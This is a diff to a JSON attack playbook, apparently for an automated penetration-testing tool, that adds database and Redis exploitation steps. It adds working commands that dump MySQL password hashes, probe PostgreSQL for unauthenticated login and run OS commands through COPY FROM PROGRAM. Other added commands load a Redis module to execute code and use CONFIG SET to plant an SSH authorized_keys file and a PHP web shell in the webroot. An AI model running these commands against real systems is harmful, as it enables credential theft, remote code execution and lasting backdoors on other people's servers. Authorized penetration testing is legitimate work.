@@ -67,6 +67,11 @@
         {
           "tool": "mysql",
           "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT username,password FROM users;' {{database}}"
+        },
+        {
+          "tool": "mysql",
+          "run": "SHOW DATABASES; SELECT user,authentication_string FROM mysql.user;",
+          "note": "Inside an active interactive MySQL or MariaDB prompt: list application schemas and dump database account hashes without re-entering CLI credentials."
         }
       ],
       "requires_any": [
@@ -225,6 +230,11 @@
         {
           "tool": "psql",
           "run": "PGPASSWORD={{password}} psql -h {{target}} -U {{user}} -c '\\l'"
+        },
+        {
+          "tool": "psql",
+          "run": "psql -h {{target}} -U postgres -c '\\l'",
+          "note": "Zero-credential trust or default probe: test whether pg_hba.conf permits unauthenticated trust login as the default postgres role."
         }
       ],
       "requires_all": []
@@ -268,6 +278,11 @@
           "tool": "psql",
           "run": "psql -h {{target}} -U {{user}} -c \"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;\"",
           "note": "The readable form: FROM PROGRAM captures command output into a table you then SELECT. `uid=...` is your foothold; swap id for a reverse shell and catch it with the listener card."
+        },
+        {
+          "tool": "psql",
+          "run": "DROP TABLE IF EXISTS obol_cmd; CREATE TABLE obol_cmd(o text); COPY obol_cmd FROM PROGRAM 'id'; SELECT * FROM obol_cmd;",
+          "note": "Interactive psql prompt form: run COPY FROM PROGRAM directly inside an open PostgreSQL session and read command output from the temporary table."
         }
       ],
       "deprioritize_when": [
@@ -311,6 +326,11 @@
         {
           "tool": "redis-cli",
           "run": "redis-cli -h {{target}} KEYS '*'"
+        },
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} -a '{{password}}' INFO && redis-cli -h {{target}} -a '{{password}}' KEYS '*'",
+          "note": "Authenticated Redis enumeration once a requirepass secret is recovered from configuration files or application source."
         }
       ],
       "requires_all": []
@@ -795,15 +815,21 @@
         "redis.unauth"
       ],
       "produces": [
-        "foothold.linux"
+        "foothold.linux",
+        "access.shell"
+      ],
+      "obsoleted_by": [
+        "foothold.linux",
+        "access.admin",
+        "objective.root_flag"
       ],
       "priority": 83,
       "autonomy": "approve",
       "sequence": true,
-      "proves": "arbitrary code execution via Redis rogue master replication and module loading",
-      "does_not_prove": "exploitation on Redis 6.0+ with ACL restrictions or module loading disabled",
+      "proves": "arbitrary code execution via Redis rogue master replication, module loading, or CONFIG SET file write",
+      "does_not_prove": "exploitation on Redis 7.0+ with protected-configs and module loading disabled",
       "report": {
-        "finding": "Redis Unauthenticated Master Replication Remote Code Execution",
+        "finding": "Redis Unauthenticated or Authenticated Remote Code Execution",
         "severity": "critical"
       },
       "refs": [
@@ -819,6 +845,21 @@
           "tool": "python3",
           "run": "python3 redis-rogue-server.py --rhost {{target}} --lhost {{lhost}} --lport 6379 --exp exp.so",
           "note": "Executes rogue Redis master replication attack to upload module and execute interactive shell."
+        },
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} -a '{{password}}' MODULE LOAD /var/www/html/module.so && redis-cli -h {{target}} -a '{{password}}' system.exec \"id\"",
+          "note": "Authenticated or staged MODULE LOAD execution when a shared object module has been placed on a local path (via FTP, SMB, or web upload)."
+        },
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} CONFIG SET dir /var/lib/redis/.ssh && redis-cli -h {{target}} CONFIG SET dbfilename authorized_keys && redis-cli -h {{target}} SAVE",
+          "note": "SSH authorized_keys write primitive when Redis runs with write permission to a user's .ssh directory (after setting a key value containing your SSH public key)."
+        },
+        {
+          "tool": "redis-cli",
+          "run": "redis-cli -h {{target}} CONFIG SET dir /var/www/html && redis-cli -h {{target}} CONFIG SET dbfilename shell.php && redis-cli -h {{target}} SET obol \"<?php system($_GET['c']); ?>\" && redis-cli -h {{target}} SAVE",
+          "note": "Webroot shell write primitive when Redis has write permission to an HTTP-published directory."
         }
       ],
       "requires_all": [],
